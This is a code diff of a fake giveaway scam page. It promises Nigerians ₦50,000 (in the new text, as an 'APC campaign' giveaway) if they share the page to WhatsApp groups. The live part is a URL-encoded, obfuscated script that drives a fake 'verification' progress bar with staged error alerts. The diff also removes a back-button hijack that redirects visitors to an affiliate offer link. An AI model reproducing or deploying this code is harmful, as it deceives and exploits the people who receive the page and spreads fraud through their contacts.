@@ -649,15 +649,20 @@ font-family: 'Noto Nastaliq Urdu', serif;
     </center>
    </div>
    <div id="share">
-    <p class="tip">Congratulation! Your Application Number is <span id="output"></span></p>
-    <p class="tip">NAME: <span id="getname"></span>, Account number <span id="getname2"></span></p>
-    <p class="tip">Your ₦50,000 Naira is still <font color="red"><b>pending</b></font> because you have not completed the Human verification process <span class="amount"> Please complete the verification process to withdraw your money Now</span>
-     <br></p>
-    <h5 style="color: red;">How to proceed: to the withdrawal below 👇</h5>
-    <p class="tip">1. Share it to 5 groups or with 15 friends on WhatsApp (Click the "SHARE" button below).</p>
-    <p class="tip">2. Your registration will automatically complete once the GREEN verification bar is filled after sharing.</p>
-    <p class="tip">3. Then Click "Withdraw Cash now" below to claim your ₦50,000 ..</p>
-    <h5 style="color: red;">👇👇</h5>
+    <p class="tip"> Congratulations, <span id="getname"></span> </p>
+            <p class="tip">
+                your account number has been selected to receive the APC ₦50,000 campaign Giveaway to Nigerians.  
+               <span class="amount"> Complete the Process Below to recieve it now! </span>
+                <br>
+                <br>
+              <strong>HOW TO PROCEED BELOW:👇</strong>
+            <br>
+                <br>
+            <p class="tip"><strong>1.</strong> Share it with 5 groups or 15 friends on WhatsApp to also benefit from this offer (Click on the "SHARE" icon below).</p>
+	   <br>
+            <p class="tip"><strong>2.</strong> You will be redirected automatically to the "WITHDRAWAL" page once the GREEN verification
+                bar is filled after sharing.</p>
+	   
     <button id="whatsapp">SHARE</button>
     <div class="barr">
      <div class="fill">
@@ -829,19 +834,12 @@ $(document).click(function () {
 <!-- code by OD -->
 document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
 </script>
-   <script>
-    window.onhashchange=function(){jp();};
-    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-    function jp() {
-        fh();}
-    setTimeout('hh();', 500);
-    function fh(){
-        location.href="https://www.bingogreen.help/click?offer_id=37030&pub_id=286177&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE";
-    }
-    function goon(){
-        location.href="https://www.bingogreen.help/click?offer_id=37030&pub_id=286177&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE";
-    }
-</script>
+
+
+
+
+
+	  
    <script>
 (function (global) {
  
